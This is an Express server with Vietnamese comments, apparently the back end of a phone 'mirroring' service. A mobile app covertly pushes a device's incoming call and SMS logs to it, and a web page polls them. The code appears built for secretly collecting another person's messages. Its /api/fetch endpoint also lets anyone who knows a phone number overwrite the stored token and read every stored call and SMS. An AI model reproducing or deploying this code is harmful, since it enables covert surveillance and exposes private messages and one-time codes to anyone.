const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Đường dẫn lưu trữ file cơ sở dữ liệu JSON tổng
const DB_FILE = path.join(__dirname, 'all_logs.json');

// --- HÀM TIỆN ÍCH ĐỌC/GHI ĐĨA CỨNG ---
function readDatabase() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}));
            return {};
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return data.trim() ? JSON.parse(data) : {};
    } catch (error) {
        console.error("Lỗi đọc file database:", error);
        return {};
    }
}

function writeDatabase(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4), 'utf8');
    } catch (error) {
        console.error("Lỗi ghi file database:", error);
    }
}

// Trả file giao diện quản trị điều khiển về khi truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'app.html'));
});

/**
 * 1. API NHẬN REQUEST ĐẨY LÊN TỪ APP MOBILE (POST)
 * Nơi App di động gửi INIT, CALL ngầm, hoặc tin nhắn SMS sang
 */
app.post('/api/push', (req, res) => {
    const { myPhoneNumber, token, type, incomingNumber, content, time } = req.body;

    // Kiểm tra thông tin cốt lõi bắt buộc
    if (!myPhoneNumber || !token || !type) {
        return res.status(400).json({ error: "Thiếu thông tin định danh (SĐT hoặc Token)!" });
    }

    const db = readDatabase();
    const isNewAccount = !db[myPhoneNumber];

    // KIỂM TRA & KHỞI TẠO HỒ SƠ TỪ MOBILE
    if (isNewAccount) {
        db[myPhoneNumber] = {
            token: token,
            calls: [],
            sms: []
        };
        console.log(`[App Push - Khởi tạo] Tạo hồ sơ gốc tự động cho số: ${myPhoneNumber}`);
    } else {
        // Nếu tài khoản đã có sẵn nhưng app đổi mã Token mới (Ví dụ: người dùng bấm Sinh mã mới)
        if (db[myPhoneNumber].token !== token) {
            console.log(`[App Push - Cập nhật] Số ${myPhoneNumber} cập nhật mã Token mới từ thiết bị: ${token}`);
            db[myPhoneNumber].token = token;
        }
    }

    // XỬ LÝ RIÊNG CHO LỆNH KHỞI TẠO TỰ ĐỘNG (INIT) CỦA APP
    if (type.toUpperCase() === 'INIT') {
        const logId = "INIT_" + Date.now();
        db[myPhoneNumber].sms.push({
            id: logId,
            incomingNumber: incomingNumber || "HỆ THỐNG",
            content: content || "Thiết bị kết nối ngầm thành công.",
            time: time || new Date().toLocaleTimeString()
        });
        
        writeDatabase(db);
        return res.status(200).json({ status: "Success", message: "Đã kích hoạt tài khoản trực tuyến từ xa thành công." });
    }

    // XỬ LÝ CHO CÁC LOG CUỘC GỌI / SMS THỰC TẾ ĐẨY LÊN SAU NÀY
    if (!incomingNumber) {
        return res.status(400).json({ error: "Thiếu số điện thoại đối tác gửi đến!" });
    }

    const logId = type.toUpperCase() + "_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
    const newLogItem = {
        id: logId,
        incomingNumber: incomingNumber,
        content: content || "",
        time: time || new Date().toLocaleTimeString()
    };

    if (type.toUpperCase() === 'CALL') {
        db[myPhoneNumber].calls.push(newLogItem);
    } else if (type.toUpperCase() === 'SMS') {
        db[myPhoneNumber].sms.push(newLogItem);
    }

    writeDatabase(db);
    return res.status(200).json({ status: "Success", message: "Đã đồng bộ dữ liệu thành công." });
});

/**
 * 2. API TRẢ DỮ LIỆU VỀ CHO GIAO DIỆN WEB POLLING (GET)
 * Đã tối ưu cơ chế tự động đối chiếu: Chưa có đối tượng thì tự tạo, khác Token tự cập nhật đè.
 */
app.get('/api/fetch', (req, res) => {
    const { phone, token } = req.query;

    // Kiểm tra tham số đầu vào từ URL Web
    if (!phone || !token) {
        return res.status(400).json({ 
            error: "Thiếu tham số truy vấn (Yêu cầu phải có phone và token)!" 
        });
    }

    let db = readDatabase(); 
    let isNewAccount = !db[phone];

    // ĐỐI CHIẾU & TỰ ĐỘNG KHỞI TẠO NẾU CHƯA CÓ ĐỐI TƯỢNG TRÊN SERVER
    if (isNewAccount) {
        console.log(`[Web Fetch - Tạo mới] Không tìm thấy đối tượng ${phone}. Đang tạo phân vùng trống...`);
        
        db[phone] = {
            token: token,
            calls: [],
            sms: [
                {
                    id: "INIT_WEB_" + Date.now(),
                    incomingNumber: "HỆ THỐNG",
                    content: "Tài khoản được khởi tạo tự động từ giao diện kết nối Web.",
                    time: new Date().toLocaleTimeString()
                }
            ]
        };
        writeDatabase(db);
    } else {
        // CƠ CHẾ ĐỒNG BỘ TIN CẬY HOÀN TOÀN (TỐI ƯU):
        // Nếu trên Web nhập mã Token mới (hoặc Web lưu cấu hình cũ nhưng Server Render vừa reset mất file json),
        // Server sẽ tự động cập nhật đè Token mới từ Web lên để hai bên luôn khớp lệnh, tránh lỗi 403.
        if (db[phone].token !== token) {
            console.log(`[Web Fetch - Đồng bộ Token] Số ${phone} cập nhật lại mã Token theo Web: ${token}`);
            db[phone].token = token;
            writeDatabase(db);
        }
    }

    // Trả về dữ liệu sạch cô lập duy nhất của số điện thoại này
    const accountData = db[phone];

    return res.status(200).json({
        status: "Success",
        phone: phone,
        calls: accountData.calls || [],
        sms: accountData.sms || []
    });
});

// Cấu hình cổng chạy tương thích tuyệt đối với Cloud Render / VPS
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=== SERVER GƯƠNG CHIẾU INFORMINI ĐANG CHẠY TẠI PORT: ${PORT} ===`);
});